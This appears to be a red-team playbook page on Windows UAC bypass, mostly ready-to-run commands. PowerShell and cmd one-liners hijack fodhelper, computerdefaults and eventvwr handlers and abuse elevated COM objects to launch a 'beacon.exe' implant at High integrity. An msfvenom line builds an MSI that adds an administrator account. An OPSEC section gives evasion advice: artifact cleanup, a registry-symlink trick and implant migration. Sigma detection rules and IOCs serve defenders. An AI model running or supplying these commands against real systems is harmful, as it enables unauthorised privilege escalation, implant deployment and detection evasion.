# UAC Bypass (Medium → High Integrity)

ATT&CK: T1548.002 (Abuse Elevation Control Mechanism: Bypass User Account Control).
CWE-269 (Improper Privilege Management), CWE-250 (Execution with Unnecessary Privileges).

## Theory / Mechanism

UAC bypasses are **not** memory-corruption exploits — they abuse Windows *design* choices.
Microsoft ships **auto-elevated** binaries that jump from Medium to High integrity *without* a
consent prompt (manifest `autoElevate=true` + a trusted directory + valid MS signature). If you can
control what such a binary launches as a child — typically via an `HKCU` handler the binary reads —
your code runs at High integrity.

Pre-conditions for the classic registry hijacks: the current user is a **member of the local
Administrators group**, the process is **Medium** integrity, and UAC is set to default
(`ConsentPromptBehaviorAdmin = 5`, not "Always Notify"). These are *not* a privilege escalation
across users — they cross the UAC integrity boundary for an already-admin user. (Microsoft does not
treat UAC as a security boundary, so these are generally not patched as CVEs.)

### Discovery pattern (how new bypasses are found)
Run ProcMon on an auto-elevated binary, filter `RegOpenKey`/`RegQueryValue` with result
`NAME NOT FOUND` under `HKCU` — any missing `HKCU` key the elevated binary reads is a hijack point,
since a standard user can create it.

## Modern 2024-2026 status (verified)

- **fodhelper.exe / computerdefaults.exe** (UACME method 33): hijack
  `HKCU\Software\Classes\ms-settings\Shell\Open\command` + `DelegateExecute` → still works on
  current Win10/11. One bypass covers both binaries.
- **eventvwr.exe**: hijack `HKCU\Software\Classes\mscfile\shell\open\command` → reads `.msc` handler.
- **ICMLuaUtil COM** (CMSTPLUA, CLSID `3E5FC7F9-...`): `AutoApproved` + `Elevated` COM object;
  `CoGetObject` with an elevation moniker → `ICMLuaUtil::ShellExec` runs elevated. Host is `DllHost`
  at High integrity. Still works; code often needs tweaking to satisfy EDR.
- **IEditionUpgradeManager COM bypass (newest, ~Sep 2025)**: a fresh take on an old COM bypass, noted
  as currently popular and still functional (with minor edits to dodge EDR signatures).
- **SilentCleanup scheduled task**: the `Microsoft\Windows\DiskCleanup\SilentCleanup` task runs
  elevated and uses `%windir%` from the environment — overwrite the user `windir` env var → elevated exec.
- **Deprecated in late 2024**: the `ctfmon` token-duplication technique was patched in late Fall 2024
  (confirmed Mar 2025); several fall-2024 methods are now dead — verify before relying on any one.
- `AlwaysInstallElevated`: if both HKLM+HKCU `Installer\AlwaysInstallElevated = 1`, an MSI runs as
  SYSTEM regardless of UAC — full privesc, not just integrity crossing.

## Complete working commands

### fodhelper (most reliable one-liner)
```powershell
# Hijack the ms-settings handler; fodhelper auto-elevates and executes it at High integrity
$cmd = "cmd.exe /c start C:\Windows\Tasks\beacon.exe"
New-Item  "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $cmd -Force
Start-Process "C:\Windows\System32\fodhelper.exe"
Start-Sleep 2
Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force        # clean up immediately
```

### computerdefaults (same hijack, alternate trigger)
```powershell
# identical ms-settings hijack as above, then:
Start-Process "C:\Windows\System32\computerdefaults.exe"
```

### eventvwr (mscfile handler)
```cmd
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /ve /d "C:\Windows\Tasks\beacon.exe" /f
eventvwr.exe
reg delete "HKCU\Software\Classes\mscfile" /f
```

### ICMLuaUtil COM (no registry hijack)
```powershell
$id = [Type]::GetTypeFromCLSID("3E5FC7F9-9A51-4367-9063-A120244FBEC7")
$o  = [Activator]::CreateInstance($id)
# ShellExec(file, params, dir, operation, show)
$o.ShellExec("C:\Windows\Tasks\beacon.exe", "", "C:\Windows\System32", "runas", 0)
```

### IEditionUpgradeManager COM (2025)
```powershell
# CLSID for IEditionUpgradeManager elevated object; AcquireModernLicenseWithPreviousVersionForOS path
$id = [Type]::GetTypeFromCLSID("01D0A625-782D-4777-8D4E-547E6457FAD5")
$o  = [Activator]::CreateInstance($id)
$o.InitializeWin7("C:\Windows\Tasks\beacon.exe", "")    # method name varies by build; enumerate via OleView
```

### AlwaysInstallElevated (true privesc → SYSTEM)
```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: both = 1? build + run an MSI (runs as SYSTEM)
:: msfvenom -p windows/x64/exec CMD="net localgroup administrators pwn /add" -f msi -o a.msi
msiexec /quiet /qn /i a.msi
```

`scripts/uac_bypass.ps1` implements fodhelper, computerdefaults, eventvwr, sdclt, ICMLuaUtil and
the AlwaysInstallElevated check behind a `-Method` switch, with automatic key cleanup and an optional
registry-symlink evasion mode.

## Detection

```yaml
title: UAC Bypass via Auto-Elevated Binary Registry Hijack
logsource: { product: windows, category: registry_event }
detection:
  hijack:
    TargetObject|contains:
      - '\Software\Classes\ms-settings\Shell\Open\command'
      - '\Software\Classes\mscfile\shell\open\command'
      - '\Software\Classes\Folder\shell\open\command'
  symlink:
    TargetObject|endswith: '\SymbolicLinkValue'           # UACME m3.5+ reg-symlink evasion
  condition: hijack or symlink
level: high
---
title: Auto-Elevated Binary Spawning a Shell (fodhelper/eventvwr/computerdefaults)
logsource: { product: windows, category: process_creation }
detection:
  sel:
    ParentImage|endswith: ['\fodhelper.exe','\eventvwr.exe','\computerdefaults.exe','\sdclt.exe','\DllHost.exe']
    Image|endswith: ['\cmd.exe','\powershell.exe','\rundll32.exe','\mshta.exe']
  condition: sel
level: high
```
IOCs: writes to `ms-settings`/`mscfile` `shell\open\command` under HKCU; `fodhelper.exe` /
`eventvwr.exe` spawning `cmd`/`powershell`; High-integrity child of `DllHost.exe`. Elastic generic
signal: the token attribute `LUA://HdAutoAp` (auto-elevated app) / `LUA://DecHdAutoAp` (descendant)
flags the whole process tree of a UAC bypass.

## OPSEC

- **Delete the HKCU key immediately** after the trigger fires — the dangling `shell\open\command` is
  the loudest IOC and breaks the legitimate app.
- Use the **reg-symlink + key-rename** trick (UACME method 3.5+: create the value as a symbolic link
  then rename the key) to dodge detection that watches the literal key path.
- COM methods (ICMLuaUtil/IEditionUpgradeManager) leave **no registry artifact** — preferred when
  registry monitoring is in play — but the High-integrity `DllHost` child is still detectable.
- Avoid spawning raw `cmd.exe`; launch your implant directly and migrate. Don't leave SYSTEM/admin
  processes parented to `fodhelper`/`eventvwr`.

## References
- hfiref0x/UACME (method catalog incl. m33 fodhelper, reg-symlink evasion)
- g3tsyst3m.com — "Creative UAC Bypass Methods for the Modern Era" (2025 updates: ctfmon patched,
  IEditionUpgradeManager COM bypass)
- elastic.co/security-labs — "Exploring Windows UAC Bypasses: Techniques and Detection" (LUA://HdAutoAp)
- CQURE — "How UAC bypass methods really work"; cqureacademy.com
